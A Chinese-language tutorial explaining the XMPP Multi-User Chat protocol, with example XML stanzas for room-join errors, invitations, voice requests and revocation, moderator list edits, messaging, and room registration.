<p>主动加入房间异常情况<br> 1 密码保护房间-加入密码保护房间，用户无法正确密码验证，服务拒绝访问并通知用户未被授权，返回类型为error的出席信息并标明&lt;not-authorized/&gt;错误(正确验证，在出席信息节满足http://jabber.org/protocol/muc名字空间的&lt;x/&gt;的&lt;password/&gt;子元素里添加正确密码即可)</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc'/&gt;<br>   &lt;error type='auth'&gt;<br>     &lt;not-authorized xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/presence&gt;<br><br> 2 仅限会员房间-加入仅限会员房间，但申请用户不是该房间成员，服务拒绝访问并通知用户不被允许加入房间，返回类型为error的出席信息并标明&lt;registration-required/&gt;错误条件</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc'/&gt;<br>   &lt;error type='auth'&gt;<br>     &lt;registration-required xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/presence&gt;<br><br> 3 禁止用户-被禁止用户(outcast)申请加入房间，服务拒绝访问，并通知用户被禁止，返回类型为error的出席信息并标明&lt;forbidden/&gt;错误条件</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc'/&gt;<br>   &lt;error type='auth'&gt;<br>     &lt;forbidden xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/presence&gt;<br><br> 4 昵称冲突-用户申请加入房间，若房间已有新用户预期昵称，服务拒绝访问并通知用户昵称冲突，返回类型为error的出席信息并标明&lt;conflict/&gt;错误条件</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc'/&gt;<br>   &lt;error type='cancel'&gt;<br>     &lt;conflict xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/presence&gt;<br><br> 5 最大用户数-用户加入房间已达到最大用户数，服务拒绝访问，并通知用户人数达到限制，返回类型为error的出席信息并标明&lt;service-unavailable/&gt;错误条件</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc'/&gt;<br>   &lt;error type='wait'&gt;<br>     &lt;service-unavailable xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/presence&gt;<br><br> 6 锁住的房间-用户加入房间处于“locked”状态，服务拒绝访问，并通知用户房间不存在，返回类型为error的出席信息并标明&lt;item-not-found/&gt;错误条件</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc'/&gt;<br>   &lt;error type='cancel'&gt;<br>     &lt;item-not-found xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/presence&gt;<br><br> 被动加入-邀请<br> 邀请根据发送邀请的方式分为两个分支<br> 分支1-直接邀请：直接从邀请者(用户)向联系人发送邀请，有助于适应被邀请者那边通信阻塞(对方可能拒绝和不在好友名单中的实体通讯)<br> 直接邀请流程：<br> 邀请者向被邀请者发送一个包含满足 jabber:x:conference名字空间的&lt;x/&gt;元素的&lt;message/&gt; 元素</p> 
<p>&lt;message<br>     from='crone1@shakespeare.lit/desktop'<br>     to='hecate@shakespeare.lit'&gt;<br>   &lt;x xmlns='jabber:x:conference'<br>      jid='darkcave@macbeth.shakespeare.lit'<br>      password='cauldronburn'<br>      reason='Hey Hecate, this is the place for all good witches!'/&gt;<br> &lt;/message&gt;<br><br> 其中jid是必须字段，表示邀请加入的群标识，password(房间是密码密码保护的)和reason(邀请原因)是可选字段<br> 此外还可以添加可选字段continue(继续one-to-one chat)和thread(跟踪会话线索)，注意continue是boolean类型</p> 
<p>&lt;message<br>     from='crone1@shakespeare.lit/desktop'<br>     to='hecate@shakespeare.lit'&gt;<br>   &lt;x xmlns='jabber:x:conference'<br>      continue='true'<br>      jid='darkcave@macbeth.shakespeare.lit'<br>      password='cauldronburn'<br>      reason='Hey Hecate, this is the place for all good witches!'<br>      thread='e0ffe42b28561960c6b12b944a092794b9683a38'/&gt;<br> &lt;/message&gt;<br><br> 若被邀请者接受邀请，则加入房间(反之则直接忽略)</p> 
<p>分支2-间接邀请：邀请者(用户)以房间(&lt;room@service&gt;)作为介导，将邀请信息发送给房间，然后由房间向被邀请者发送邀请(接受邀请进入房间同分支1进行出席信息交互以及历史信息发送)<br> 间接邀请流程：<br> 邀请者向房间发送一个包含满足 http://jabber.org/protocol/muc#user名字空间的&lt;x/&gt;元素的&lt;message/&gt; 元素</p> 
<p>&lt;message<br>     from='crone1@shakespeare.lit/desktop'<br>     to='darkcave@chat.shakespeare.lit'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;invite to='hecate@shakespeare.lit'&gt;<br>       &lt;reason&gt;<br>         Hey Hecate, this is the place for all good witches!<br>       &lt;/reason&gt;<br>     &lt;/invite&gt;<br>   &lt;/x&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 房间服务接着增加一个 ‘from’ 地址到 &lt;invite/&gt; 元素，其值为邀请者的纯JID，全JID，或房间JID，并发送邀请给‘to’地址所指明的被邀请者，其中password(房间是密码密码保护的)和reason(邀请原因)是可选字段</p> 
<p>&lt;message<br>     from='darkcave@chat.shakespeare.lit'<br>     to='hecate@shakespeare.lit'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;invite from='crone1@shakespeare.lit/desktop'&gt;<br>       &lt;reason&gt;<br>         Hey Hecate, this is the place for all good witches!<br>       &lt;/reason&gt;<br>     &lt;/invite&gt;<br>     &lt;password&gt;cauldronburn&lt;/password&gt;<br>   &lt;/x&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 如果房间是仅限成员的, 服务需把这个被邀请者加入成员列表。(注意：在仅限成员的房间里邀请的权力应该由房间管理员限定；如果一个没有权限的成员修改成员列表试图邀请别的用户，服务则返回一个&lt;forbidden/&gt; 错误给该房客(查看成员邀请章节)</p> 
<p>&lt;message<br>     from='darkcave@chat.shakespeare.lit'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='error'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;invite to='hecate@shakespeare.lit'&gt;<br>       &lt;reason&gt;<br>         Hey Hecate, this is the place for all good witches!<br>       &lt;/reason&gt;<br>     &lt;/invite&gt;<br>   &lt;/x&gt;<br>   &lt;error type='auth'&gt;<br>     &lt;forbidden xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 如果邀请者提供了一个不存在的JID, 房间则返回一个&lt;item-not-found/&gt; 错误给邀请者<br> 被邀请者可以选择正式地拒绝(反之则忽略)邀请；这是发送者希望看到的正式的通知，为了拒绝这个邀请，被邀请者必须发送以下格式的消息给 &lt;room@service&gt;谢绝邀请</p> 
<p>&lt;message<br>     from='hecate@shakespeare.lit/broom'<br>     to='darkcave@chat.shakespeare.lit'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;decline to='crone1@shakespeare.lit'&gt;<br>       &lt;reason&gt;<br>         Sorry, I'm too busy right now.<br>       &lt;/reason&gt;<br>     &lt;/decline&gt;<br>   &lt;/x&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 房间通知邀请者邀请被拒绝</p> 
<p>&lt;message<br>     from='darkcave@chat.shakespeare.lit'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;decline from='hecate@shakespeare.lit'&gt;<br>       &lt;reason&gt;<br>         Sorry, I'm too busy right now.<br>       &lt;/reason&gt;<br>     &lt;/decline&gt;<br>   &lt;/x&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 常见行为及相应处理<br> 申请发言-游客<br> 在一个被主持的房间里游客是不能发言的(发送一个消息给所有房客)，为了申请发言权，一个游客通过发送包含一个数据表格的&lt;message/&gt; 节给房间本身，这个数据表格仅仅是一个muc#role字段，值为 “participant”</p> 
<p>&lt;message from='hag66@shakespeare.lit/pda'<br>          to='darkcave@chat.shakespeare.lit'&gt;<br>   &lt;x xmlns='jabber:x:data' type='submit'&gt;<br>     &lt;field var='FORM_TYPE'&gt;<br>       &lt;value&gt;http://jabber.org/protocol/muc#request&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#role'<br>            type='text-single'<br>            label='Requested role'&gt;<br>       &lt;value&gt;participant&lt;/value&gt;<br>     &lt;/field&gt;<br>   &lt;/x&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 批准发言申请-主持人<br> 批准发言申请是主持人权限，房间收到用户发言申请，房间立即通过转发包含一个数据表格的&lt;message/&gt; 节给主持人用于批准或拒绝这个申请</p> 
<p>&lt;message from='darkcave@chat.shakespeare.lit'<br>          id='approve'<br>          to='crone1@shakespeare.lit/pda'&gt;<br>   &lt;x xmlns='jabber:x:data' type='form'&gt;<br>     &lt;title&gt;Voice request&lt;/title&gt;<br>     &lt;instructions&gt;<br>       To approve this request for voice, select <br>       the &amp;quot;Grant voice to this person?&amp;quot;<br>       checkbox and click OK. To skip this request, <br>       click the cancel button.<br>     &lt;/instructions&gt;<br>     &lt;field var='FORM_TYPE' type='hidden'&gt;<br>         &lt;value&gt;http://jabber.org/protocol/muc#request&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#role'<br>            type='text-single'<br>            label='Requested role'&gt;<br>       &lt;value&gt;participant&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#jid'<br>            type='text-single'<br>            label='User ID'&gt;<br>       &lt;value&gt;hag66@shakespeare.lit/pda&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#roomnick'<br>            type='text-single'<br>            label='Room Nickname'&gt;<br>       &lt;value&gt;thirdwitch&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#request_allow'<br>            type='boolean'<br>            label='Grant voice to this person?'&gt;<br>       &lt;value&gt;false&lt;/value&gt;<br>     &lt;/field&gt;<br>   &lt;/x&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 18<br> 19<br> 20<br> 21<br> 22<br> 23<br> 24<br> 25<br> 26<br> 27<br> 28<br> 29<br> 30<br> 31<br> 32<br> 33<br> 34<br> 35<br> 36<br> 主持人若同意发言，则提交表格</p> 
<p>&lt;message from='crone1@shakespeare.lit/pda'<br>          id='approve'<br>          to='darkcave@chat.shakespeare.lit'&gt;<br>   &lt;x xmlns='jabber:x:data' type='submit'&gt;<br>     &lt;field var='FORM_TYPE' type='hidden'&gt;<br>         &lt;value&gt;http://jabber.org/protocol/muc#request&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#role'&gt;<br>       &lt;value&gt;participant&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#jid'&gt;<br>       &lt;value&gt;hag66@shakespeare.lit/pda&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#roomnick'&gt;<br>       &lt;value&gt;thirdwitch&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#request_allow'&gt;<br>       &lt;value&gt;true&lt;/value&gt;<br>     &lt;/field&gt;<br>   &lt;/x&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 18<br> 19<br> 20<br> 21<br> 如果主持人批准了这个发言权申请，服务将授予发言权给该房客并发送一个出席信息更新<br> 授予游客发言权-主持人<br> 主持人通过把游客的角色变更为与会者“participant”给游客授予权限<br> (发言权的授予是基于游客的房间昵称处理的，服务将从内部把这个房间昵称转成游客的全JID)<br> 主持人向服务发送一个包含满足http://jabber.org/protocol/muc#admin名字空间的&lt;query/&gt;类型为set的&lt;iq/&gt;授予游客权限(reason元素可选)</p> 
<p>&lt;iq from='crone1@shakespeare.lit/desktop'<br>     id='voice1'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item nick='thirdwitch'<br>           role='participant'/&gt;<br>           &lt;reason&gt;A worthy witch indeed!&lt;/reason&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 服务通知主持人权限授予成功</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='voice1'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='result'/&gt;<br> 1<br> 2<br> 3<br> 4<br> 然后服务以该用户的&lt;room@service/nick&gt;发送更新的出席信息给所有房客，在这个出席信息里包含了一个满足http://jabber.org/protocol/muc#user名字空间的&lt;x/&gt;元素，&lt;x/&gt;元素则包含一个&lt;item/&gt;子元素，其role属性值为“participant”，指明添加了发言权</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member'<br>           nick='thirdwitch'<br>           role='participant'&gt;<br>       &lt;reason&gt;A worthy witch indeed!&lt;/reason&gt;<br>     &lt;/item&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>[ ... ]<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 发送私有消息-任何用户<br> 因为每个房客都有唯一的房间JID，一个房客可以发送私有消息给特定房客，即通过服务发送消息给特定房客的房间JID，消息类型为chat</p> 
<p>&lt;message<br>     from='wiccarocks@shakespeare.lit/laptop'<br>     to='darkcave@chat.shakespeare.lit/firstwitch'<br>     type='chat'&gt;<br>   &lt;body&gt;I'll give thee a wind.&lt;/body&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 服务作为中转站，修改from属性值为房客放假JID，并重写to属性值为真实用户JID</p> 
<p>&lt;message<br>     from='darkcave@chat.shakespeare.lit/secondwitch'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='chat'&gt;<br>   &lt;body&gt;I'll give thee a wind.&lt;/body&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 发言-visitor或更高<br> 房客发送一个消息给所有房间内的房客的方法，是发送一个类型为 “groupchat”的消息到&lt;room@service&gt; 本身 (服务可以忽略或拒绝类型不是“groupchat”的消息)(附：在一个被主持的房间，这个权力限于角色为与会者或更高的房客拥有）</p> 
<p>&lt;message<br>     from='hag66@shakespeare.lit/pda'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='groupchat'&gt;<br>   &lt;body&gt;Harpier cries: 'tis time, 'tis time.&lt;/body&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 若发送者在房间有发言权，服务直接修改from属性为用户房间JID并反射这个消息到每个房客的全JID</p> 
<p>&lt;message<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='groupchat'&gt;<br>   &lt;body&gt;Harpier cries: 'tis time, 'tis time.&lt;/body&gt;<br> &lt;/message&gt;<br> &lt;message<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='wiccarocks@shakespeare.lit/laptop'<br>     type='groupchat'&gt;<br>   &lt;body&gt;Harpier cries: 'tis time, 'tis time.&lt;/body&gt;<br> &lt;/message&gt;<br> &lt;message<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='hag66@shakespeare.lit/pda'<br>     type='groupchat'&gt;<br>   &lt;body&gt;Harpier cries: 'tis time, 'tis time.&lt;/body&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 18<br> 撤销与会者发言权-主持人<br> 在一个被主持的房间里，主持人可能希望撤销一个与会者发言的权力，主持人通过把与会者的角色变更为游客“visitor”来撤销一个游客的发言权<br> 主持人向服务发送一个包含满足http://jabber.org/protocol/muc#admin名字空间的&lt;query/&gt;类型为set的&lt;iq/&gt;撤销与会者权限(reason元素可选)</p> 
<p>&lt;iq from='crone1@shakespeare.lit/desktop'<br>     id='voice2'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item nick='thirdwitch'<br>           role='visitor'&gt;<br>       &lt;reason&gt;Not so worthy after all!&lt;/reason&gt;<br>     &lt;/item&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 若失败(主持人试图撤销岗位等于或高于主持人的用户发言权，此外，管理员或所有者发言权不可被任何人撤销)，服务拒绝请求并返回&lt;not-allowed/&gt;错误<br> 以下为服务对于尝试从管理员，所有者或更高岗位的用户撤销权限返回错误</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='voicetest'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='error'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item nick='secondwitch' role='visitor'/&gt;<br>   &lt;/query&gt;<br>   &lt;error type='cancel'&gt;<br>     &lt;not-allowed xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 若成功，则服务通知主持人权限撤销成功</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='voice2'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='result'/&gt;<br> 1<br> 2<br> 3<br> 4<br> 服务然后以该用户的&lt;room@service/nick&gt;发送更新的出席信息给所有房客，在这个出席信息里包含了一个满足http://jabber.org/protocol/muc#user名字空间的&lt;x/&gt;元素，&lt;x/&gt;元素则包含一个&lt;item/&gt;子元素，其role属性值为“visitor”，指明移除了发言权</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member'<br>           jid='hag66@shakespeare.lit/pda'<br>           role='visitor'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>[ ... ]<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 修改发言人列表-主持人<br> 在一个被主持的房间里主持人可能希望管理发言权列表，为了达到这个目的，主持人首先通过向服务发送一个包含满足http://jabber.org/protocol/muc#admin名称空间的&lt;query/&gt;元素的类型get的&lt;iq/&gt;请求，查询房间所有角色为participant的房客列表(主持人具备修改权限的发言人列表)</p> 
<p>&lt;iq from='bard@shakespeare.lit/globe'<br>     id='voice3'<br>     to='goodfolk@chat.shakespeare.lit'<br>     type='get'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item role='participant'/&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 服务返回角色为participant的用户列表给主持人，必须包含nick和role属性，以及应该包含affiliation和jid属性</p> 
<p>&lt;iq from='goodfolk@chat.shakespeare.lit'<br>     id='voice3'<br>     to='bard@shakespeare.lit/globe'<br>     type='result'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item affiliation='none'<br>           jid='polonius@hamlet/castle'<br>           nick='Polo'<br>           role='participant'/&gt;<br>     &lt;item affiliation='none'<br>           jid='horatio@hamlet/castle'<br>           nick='horotoro'<br>           role='participant'/&gt;<br>     &lt;item affiliation='member'<br>           jid='hecate@shakespeare.lit/broom'<br>           nick='Hecate'<br>           role='participant'/&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 18<br> 19<br> 主持人修改发言人列表并返回给服务，必须包含nick和role属性，不应该包含jid属性，不能包含affiliation属性</p> 
<p>&lt;iq from='bard@shakespeare.lit/globe'<br>     id='voice4'<br>     to='goodfolk@chat.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item nick='Hecate'<br>           role='visitor'/&gt;<br>     &lt;item nick='rosencrantz'<br>           role='participant'&gt;<br>       &lt;reason&gt;A worthy fellow.&lt;/reason&gt;<br>     &lt;/item&gt;<br>     &lt;item nick='guildenstern'<br>           role='participant'&gt;<br>       &lt;reason&gt;A worthy fellow.&lt;/reason&gt;<br>     &lt;/item&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 若成功，服务通知主持人修改成功</p> 
<p>&lt;iq from='goodfolk@chat.shakespeare.lit'<br>     id='voice1'<br>     to='bard@shakespeare.lit/globe'<br>     type='result'/&gt;<br> 1<br> 2<br> 3<br> 4<br> 若失败(主持人试图撤销岗位等于或高于主持人的用户发言权，此外，管理员或所有者发言权不可被任何人撤销)，服务拒绝请求并返回&lt;not-allowed/&gt;错误</p> 
<p>&lt;iq from='goodfolk@chat.shakespeare.lit'<br>     id='voicetest'<br>     to='bard@shakespeare.lit/globe'<br>     type='error'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item jid='hecate@shakespeare.lit'<br>           nick='Hecate'<br>           role='visitor'/&gt;<br>   &lt;/query&gt;<br>   &lt;error type='cancel'&gt;<br>     &lt;not-allowed xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 注册到房间-无岗位用户(或visitor)<br> 针对无岗位用户(或者被主持房间的游客)通过注册成文房间成员，或者仅限会员的房间，用户加入需要申请会籍<br> 用户通过向服务发送包含一个满足jabber:iq:register名称空间的&lt;query/&gt;元素且类型为get的&lt;iq/&gt;申请注册</p> 
<p>&lt;iq from='hag66@shakespeare.lit/pda'<br>     id='reg1'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='get'&gt;<br>   &lt;query xmlns='jabber:iq:register'/&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 用户申请被拒绝，房间返回&lt;not-allowed/&gt;错误给用户<br> 申请房间不存在，房间返回&lt;item-not-found错误给用户<br> 用户已经注册，房间返回一个类型为result的&lt;iq/&gt;节，并包含一个空的&lt;register/&gt;元素给用户<br> 否则，房间返回一个数据表单“Data Form”给该用户，如下典型示例</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='reg1'<br>     to='hag66@shakespeare.lit/pda'<br>     type='result'&gt;<br>   &lt;query xmlns='jabber:iq:register'&gt;<br>     &lt;instructions&gt;<br>       To register on the web, visit http://shakespeare.lit/<br>     &lt;/instructions&gt;<br>     &lt;x xmlns='jabber:x:data' type='form'&gt;<br>       &lt;title&gt;Dark Cave Registration&lt;/title&gt;<br>       &lt;instructions&gt;<br>         Please provide the following information<br>         to register with this room.<br>       &lt;/instructions&gt;<br>       &lt;field<br>           type='hidden'<br>           var='FORM_TYPE'&gt;<br>         &lt;value&gt;http://jabber.org/protocol/muc#register&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Given Name'<br>           type='text-single'<br>           var='muc#register_first'&gt;<br>         &lt;required/&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Family Name'<br>           type='text-single'<br>           var='muc#register_last'&gt;<br>         &lt;required/&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Desired Nickname'<br>           type='text-single'<br>           var='muc#register_roomnick'&gt;<br>         &lt;required/&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Your URL'<br>           type='text-single'<br>           var='muc#register_url'/&gt;<br>       &lt;field<br>           label='Email Address'<br>           type='text-single'<br>           var='muc#register_email'/&gt;<br>       &lt;field<br>           label='FAQ Entry'<br>           type='text-multi'<br>           var='muc#register_faqentry'/&gt;<br>     &lt;/x&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 18<br> 19<br> 20<br> 21<br> 22<br> 23<br> 24<br> 25<br> 26<br> 27<br> 28<br> 29<br> 30<br> 31<br> 32<br> 33<br> 34<br> 35<br> 36<br> 37<br> 38<br> 39<br> 40<br> 41<br> 42<br> 43<br> 44<br> 45<br> 46<br> 47<br> 48<br> 49<br> 50<br> 51<br> 52<br> 用户完成表单选项并提交表单给服务</p> 
<p>&lt;iq from='hag66@shakespeare.lit/pda'<br>     id='reg2'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='jabber:iq:register'&gt;<br>     &lt;x xmlns='jabber:x:data' type='submit'&gt;<br>       &lt;field var='FORM_TYPE'&gt;<br>         &lt;value&gt;http://jabber.org/protocol/muc#register&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#register_first'&gt;<br>         &lt;value&gt;Brunhilde&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#register_last'&gt;<br>         &lt;value&gt;Entwhistle-Throckmorton&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#register_roomnick'&gt;<br>         &lt;value&gt;thirdwitch&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#register_url'&gt;<br>         &lt;value&gt;http://witchesonline/~hag66/&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#register_email'&gt;<br>         &lt;value&gt;hag66@witchesonline&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#register_faqentry'&gt;<br>         &lt;value&gt;Just another witch.&lt;/value&gt;<br>       &lt;/field&gt;<br>     &lt;/x&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 18<br> 19<br> 20<br> 21<br> 22<br> 23<br> 24<br> 25<br> 26<br> 27<br> 28<br> 29<br> 30<br> 若成功，房间通知用户注册请求已经被成功处理</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='reg2'<br>     to='hag66@shakespeare.lit/pda'<br>     type='result'/&gt;<br> 1<br> 2<br> 3<br> 4<br> 若失败，根据失败原因分为多个分支<br> 分支1 期望房间昵称已经被申请保留，拒绝申请，并返回一个&lt;conflict/&gt;错误给用户</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='reg2'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;error type='cancel'&gt;<br>     &lt;conflict xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 分支2 申请房间不支持用户注册，拒绝申请，并返回一个&lt;service-unavailable/&gt;错误给用户</p> 
